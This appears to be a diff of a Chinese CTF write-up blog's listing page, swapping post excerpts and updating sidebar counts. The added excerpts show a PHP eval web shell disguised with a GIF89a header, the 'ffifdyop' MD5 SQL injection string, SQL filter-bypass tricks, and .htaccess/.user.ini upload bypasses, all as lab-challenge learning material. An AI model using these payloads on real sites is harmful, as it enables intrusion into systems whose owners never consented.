@@ -204,7 +204,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">89</div>
+    <div class="sidebar-state-number">85</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -212,7 +212,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">66</div>
+    <div class="sidebar-state-number">62</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -268,147 +268,6 @@
 
           <section id="main">
   
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/26/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" aria-label="[GXYCTF2019]禁止套娃"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[GXYCTF2019]禁止套娃" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-26</span>
-        <span><span class="icon-pencil"></span>681 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
-      </div>
-      <h2 class="post-title">[GXYCTF2019]禁止套娃</h2>
-      <article class="post-article">
-        
-            考察知识点：
-12git泄露无参
-
-
- 进入题目
-搜查源码，抓包，或者用dirsearch搜都没有发现任何东西
-我们用GitHack查看一下是不是源码泄露
-1python GitHack.py http://4bb4b91d-be9c-4a85-943f-3e68a9e33e62.node5.buuoj.cn:81/.git
-
-发现了一个index.php
-打开一看
-代码审计…
-
-1234567891011121314151617181920212223242526272829&amp;lt;?phpinclude &amp;quot;flag.php&amp;quot;; echo &amp;quot;flag在哪里呢
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/25/%5BBUUCTF%202018%5DOnline%20Tool/" aria-label="[BUUCTF 2018]Online Tool"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="../images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[BUUCTF 2018]Online Tool" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-25</span>
-        <span><span class="icon-pencil"></span>597 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
-      </div>
-      <h2 class="post-title">[BUUCTF 2018]Online Tool</h2>
-      <article class="post-article">
-        
-           又是代码审计
-123456789101112131415161718&amp;lt;?phpif (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;    $_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;] = $_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;];&amp;#125;if(!isset($_GET[&amp;#x27;host&amp;#x27;])) &amp;#123;    highlight_file(__FILE__);&amp;#125; else &amp;#123;    $host = $_GET[
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/25/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" aria-label="[BJDCTF2020]ZJCTF，不过如此"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]ZJCTF，不过如此" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-25</span>
-        <span><span class="icon-pencil"></span>797 字</span>
-        <span><span class="icon-clock"></span>3 分钟</span>
-      </div>
-      <h2 class="post-title">[BJDCTF2020]ZJCTF，不过如此</h2>
-      <article class="post-article">
-        
-           题目源码：
-1234567891011121314151617&amp;lt;?phperror_reporting(0);$text = $_GET[&amp;quot;text&amp;quot;];$file = $_GET[&amp;quot;file&amp;quot;];if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#x27;r&amp;#x27;)===&amp;quot;I have a dream&amp;quot;))&amp;#123;    echo &amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;.file_get_contents($text,&amp;#x27;r&amp;#x
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/03/25/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb/" aria-label="[网鼎杯 2020 朱雀组]phpweb"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[网鼎杯 2020 朱雀组]phpweb" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-25</span>
-        <span><span class="icon-pencil"></span>574 字</span>
-        <span><span class="icon-clock"></span>2 分钟</span>
-      </div>
-      <h2 class="post-title">[网鼎杯 2020 朱雀组]phpweb</h2>
-      <article class="post-article">
-        
-           进入题目页面后
-没发现任何东西
-但我们查看源码，发现有两个隐藏的输入框，都是用post传参的
-一个是p一个是func
-我们打开hackbar
-
-发现这两个已经传参了
-我们根据func的名字，推测func是函数，p为func的参数
-我们来实验一下
-
-果然被回显了
-那我们就可以用它尝试着去读取文件或命令执行了
-system等命令执行函数都被过滤了
-试了一下，好像只有highlight_file和file_get_contents能用
-我们用file_get_contents查看index.php的源码
-12345678910111213141516171819202122232425262728
-        
-      </article>
-    </div>
-  </div>
-</div>
   
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
@@ -613,6 +472,173 @@ web78(无过滤)123456if(isset($_GET[&amp;#x27;file&amp;#x27;]))&amp;#123;    $f
   </div>
 </div>
   
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/16/%5BSUCTF%202019%5DCheckIn/" aria-label="[SUCTF 2019]CheckIn"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[SUCTF 2019]CheckIn" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-16</span>
+        <span><span class="icon-pencil"></span>340 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">[SUCTF 2019]CheckIn</h2>
+      <article class="post-article">
+        
+           
+我们先上传一个写有一句话木马的php文件试一下
+回显说文件后缀不能有ph
+所以我们php3,php5,phhtml都不能用了
+那我们再上传一个后缀名改为jpg的一句话木马文件
+
+发现不能有&amp;lt;?符号
+那我们使用js
+1&amp;lt;script language=&amp;#x27;php&amp;#x27;&amp;gt; @eval($_POST[&amp;#x27;pass&amp;#x27;]);&amp;lt;/script&amp;gt;
+
+再次提交
+
+发现它后端检查了文件的标识头
+那我们就可以修改一下文件的标识头
+1gif文件：直接在文件内容开头写入GIF89a就行，一般都用这个，因为好记
+
+再次上传，上传成功
+现在就要考虑如何将上
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/15/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHardSQL/" aria-label="[极客大挑战 2019]HardSQL"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[极客大挑战 2019]HardSQL" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-15</span>
+        <span><span class="icon-pencil"></span>459 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">[极客大挑战 2019]HardSQL</h2>
+      <article class="post-article">
+        
+           
+判断过滤法一(Fuzz测试)法二(自己试)：过滤了空格
+试了很多，空格只能用反引号和括号来绕过
+过滤了**&amp;#x3D;**
+可以用like来绕过
+过滤了substring与mid
+可以用right与left来绕过
+知识点：
+RIGHT 是一个字符串函数，用于从字符串的右侧提取指定数量的字符
+1RIGHT(string, length)
+
+
+string：要提取字符的字符串。
+length：要提取的字符数。如果 length 大于字符串的长度，则返回整个字符串。
+
+LEFT 是一个字符串函数，用于从字符串的左侧提取指定数量的字符。它的语法如下：
+1LEFT(string, length)
+
+
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/14/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/" aria-label="[MRCTF2020]你传你🐎呢"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[MRCTF2020]你传你🐎呢" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-14</span>
+        <span><span class="icon-pencil"></span>308 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">[MRCTF2020]你传你🐎呢</h2>
+      <article class="post-article">
+        
+          
+判断检验方式我们发现前端是没有检验的
+所以是后端检验文件
+我们先试着上传一个php文件，里面有一句话木马–&amp;gt;上传失败
+上传php文件，抓包修改文件后缀名为png–&amp;gt;上传失败
+上传php文件，抓包修改文件后缀名和Content-Type:png 和 image&amp;#x2F;png –&amp;gt;上传成功
+所以我们猜测是对文件后缀名和Content-Type进行了校验
+如何成功解析php文件但当我们上传了文件之后发现它变成了一个png文件，无法正常解析为php文件
+所以我们需要一个外物来助它变为php文件
+这时候就想到了.user.ini文件和.htaccess文件
+这里上传.user.i
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/13/%5BBJDCTF2020%5DEasy%20MD5/" aria-label="[BJDCTF2020]Easy MD5"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]Easy MD5" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-13</span>
+        <span><span class="icon-pencil"></span>210 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">[BJDCTF2020]Easy MD5</h2>
+      <article class="post-article">
+        
+            没找到有用信息
+抓个包看看
+
+响应包里看到一个查询语句
+有个md5语法
+第一关(md5的sql注入)
+所以我们需要输入一个字符串使得它md5加密后返回’or’XXXXXXXXX(这里的XXXXX是一些乱码和不可见字符)
+这里的SQL语句会变成
+1select * from `admin` where password=&amp;#x27;&amp;#x27;or&amp;#x27;XXXXXXXXX&amp;#x27;  
+
+这里用：ffifdyop,这个MD5加密后会返回’or’6XXXXXXXXX
+第二关(md5弱比较)查看源码
+
+这里随便上传两个md5编码后是0e…的就行了
+12345678910PM1kVTMBE
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
 
 
   <nav id="page-nav" data-aos="fade-up">
@@ -646,10 +672,10 @@ web78(无过滤)123456if(isset($_GET[&amp;#x27;file&amp;#x27;]))&amp;#123;    $f
     
       <div>
         <span class="icon-brush"></span>
-        120.8k
+        115.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        08:20
+        07:58
       </div>
     
     
@@ -685,7 +711,7 @@ web78(无过滤)123456if(isset($_GET[&amp;#x27;file&amp;#x27;]))&amp;#123;    $f
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">89</div>
+    <div class="sidebar-state-number">85</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -693,7 +719,7 @@ web78(无过滤)123456if(isset($_GET[&amp;#x27;file&amp;#x27;]))&amp;#123;    $f
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">66</div>
+    <div class="sidebar-state-number">62</div>
   </div>
 </div>
 <div class="sidebar-social">
